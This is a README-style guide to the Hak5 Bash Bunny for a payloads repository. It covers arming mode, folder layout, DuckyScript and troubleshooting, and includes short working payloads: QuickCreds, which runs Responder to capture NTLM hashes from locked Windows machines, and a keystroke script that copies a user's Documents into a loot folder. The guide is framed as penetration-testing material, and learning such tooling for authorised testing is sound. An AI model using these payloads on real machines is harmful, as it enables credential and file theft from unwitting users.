# 🐰 Bash Bunny Payloads Repository for Spraggins Designs

## by Austin Spraggins
### 📅 2024-08-08

---

## Introduction

The Bash Bunny by Hak5 is a powerful tool for penetration testers and security researchers. It emulates trusted USB devices like gigabit Ethernet, serial, flash storage, and keyboards to execute a variety of exploits such as data exfiltration, installing backdoors, and more.

---

## 🚀 Getting Started

### 🔀 Switch Positions

- **Position 3 (closest to the USB plug)**: Boots into arming mode, enabling both Serial and Mass Storage.
- **Position 1 and 2**: Used for payload execution. The corresponding `payload.txt` in `/payloads/switch1` or `/payloads/switch2` will be executed on boot.

### 🗂️ Mass Storage Structure

- **📁 /docs**: Home to documentation.
- **🌐 /languages**: Additional HID Keyboard layouts/languages.
- **📂 /loot**: Storage for logs and other data from payloads.
- **🔧 /tools**: Install additional deb packages and other tools.
- **📑 /payloads**: Active payloads, library, and extensions.
  - **/payloads/switch1** and **/payloads/switch2**: Home to `payload.txt` and accompanying files for execution.
  - **/payloads/library**: Payloads library.
  - **/payloads/library/extensions**: Bash Bunny extensions.

---

## 🌈 LED Status Indications

- **Green (blinking)**: Booting up.
- **Blue (blinking)**: Arming Mode.
- **Red (blinking)**: Recovery Mode or Firmware Flashing from v1.0 (DO NOT UNPLUG).
- **Red/Blue Alternating**: Recovery Mode or Firmware Flashing from v1.1+ (DO NOT UNPLUG).

---

## 📦 Installing Additional Tools

1. Place `.deb` files or tool directories into `/tools` on the mass storage partition.
2. Reboot Bash Bunny in arming mode.
3. Tools will be installed, indicated by a solid magenta LED (SETUP).

Example for installing Impacket:
```bash
cp impacket /tools/
```
Reboot Bash Bunny in arming mode to install.

---

## 🌐 Installing Additional Languages

1. Place two-letter-country-code.json file in the `/languages` folder on the mass storage partition.
2. Reboot Bash Bunny in arming mode.

Example for setting US keyboard layout in payload:
```bash
DUCKY_LANG us
```

---

## 📝 Writing Payloads

### Basics

- Payloads must be named `payload.txt`.
- Use any standard text editor (e.g., Notepad, vi, nano).
- Place `payload.txt` in `/payloads/switch1` or `/payloads/switch2` for execution.

### 🦆 DuckyScript

DuckyScript commands are written in ALL CAPS:
```plaintext
ATTACKMODE HID STORAGE
LED ATTACK
QUACK STRING Hello World
```

### 🔌 Extensions

Extensions augment DuckyScript with additional functions. Place extensions in `/payloads/library/extensions`.

Example extension usage:
```plaintext
GET TARGET_IP # Exports $TARGET_IP
REQUIRETOOL impacket
```

### 💡 Example Payload

```plaintext
# Title: QuickCreds
# Description: Steals NTLM hashes from a locked Windows computer
# Author: Hak5Darren

LED SETUP
ATTACKMODE RNDIS_ETHERNET
GET TARGET_HOSTNAME
GET TARGET_IP
python Responder.py -I usb0 &
until [ -f logs/*NTLM* ]; do sleep 1; done
LED FINISH
```

---

## 🌐 Network Hijacking Attacks

Emulate specialized Ethernet adapters for network attacks:
```plaintext
ATTACKMODE RNDIS_ETHERNET # For Windows
ATTACKMODE ECM_ETHERNET # For Mac/Linux
```

---

## 📤 Exfiltration Payloads

### Top 5 Payloads

1. **USB Exfiltrator**
2. **Faster SMB Exfiltrator**
3. **Optical Exfiltration**
4. **Dropbox Exfiltrator**
5. **PowerShell TCP Extractor**

Example for USB Exfiltrator:
```plaintext
ATTACKMODE HID STORAGE
QUACK STRING mkdir C:\loot
QUACK ENTER
QUACK STRING xcopy C:\Users\%USERNAME%\Documents\*.* C:\loot /s /e /q /y
QUACK ENTER
```

---

## 🔄 Firmware Updates

1. Download the latest firmware from [Hak5](https://downloads.hak5.org).
2. Copy the `.tar.gz` file to the root of the mass storage partition in arming mode.
3. Safely eject and reconnect the Bash Bunny.
4. Wait for the update to complete, indicated by the LED status.

---

## 🛠️ Troubleshooting

### 🔄 Factory Reset

1. Set the switch to arming mode.
2. Plug and unplug the Bash Bunny immediately after the green LED turns off. Repeat three times.
3. Plug in the Bash Bunny and wait approximately 5 minutes for it to reset.

### 🔑 Password Reset

1. Create a `payload.txt` in `/payloads/switch1/` with the following content:
    ```bash
    #!/bin/bash
    LED SETUP
    ATTACKMODE SERIAL
    echo -e "hak5bunny\nhak5bunny" | passwd
    LED FINISH
    ```
2. Safely eject the Bash Bunny.
3. Flip the switch to position 1.
4. Plug in the Bash Bunny and wait for the green blinking FINISH pattern.

---

## 🎥 Video Guides

- [Bash Bunny Primer](https://youtu.be/8j6hrjSrJaM)
- [Bash Bunny Phishing Attack with Hamsters](https://youtu.be/TYR2a2XoK3A)
- [Password Grabber Bash Bunny Payload](https://youtu.be/LtqsKftRFiw)

---

## Conclusion

The Bash Bunny is a versatile and powerful tool for a variety of penetration testing and security research tasks. By understanding its capabilities and following this guide, you can effectively utilize the Bash Bunny in your security toolkit.
